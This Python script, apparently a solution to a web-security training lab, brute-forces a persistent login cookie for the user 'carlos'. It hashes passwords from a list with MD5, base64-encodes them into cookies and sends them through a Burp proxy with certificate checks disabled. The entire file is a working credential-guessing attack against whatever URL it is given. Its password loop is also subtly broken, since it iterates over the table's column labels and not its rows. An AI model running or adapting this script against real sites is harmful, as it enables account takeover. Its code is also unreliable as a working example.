import base64
import hashlib
import pandas as pd
import sys
import requests
import urllib3


# Suppress the insecure requests warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Add proxy for troubleshoot, for urllib3 all proxies should use http
# Uses the Burp proxy -> Make sure Burp is running
proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
}

def cookie_bruteforce(url):
    password_list = []
    data = pd.read_csv('./burp_pass.csv')
    for passw in data:
        password_list.append(passw)

    # Do processing in single loop to be able to print password
    for pw in password_list:
        result = hashlib.md5(pw.encode())
        #print(result.hexdigest())
        md5_pw = (result.hexdigest())
        message = 'carlos:'+md5_pw
        #print(message)
        message_bytes = message.encode('ascii')
        base64_bytes = base64.b64encode(message_bytes)
        base64_message = base64_bytes.decode('ascii')
        #print(base64_message)

        cookies = {
            "stay-logged-in":base64_message
        }   

        r = requests.get(url+'my-account', cookies=cookies, verify=False, proxies=proxies)
        if 'Update email' in r.text:
            print(f'***** {base64_message} valid stay-logged-in cookie *****')
            print(f'*** {pw} valid for carlos *****')
            break


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        # Initially tried w/session cookie in case needed - testing determined not needed
        #session_cookie = sys.argv[2].strip()
    except IndexError:
        print(f'[-] Usage: {sys.argv[0]} <url>')
        print(f'[-] Example: {sys.argv[0]} www.example.com')
        sys.exit(-1)
    
    
    print('[-] Performing stay-logged-in cookie brute force')
    cookie_bruteforce(url)




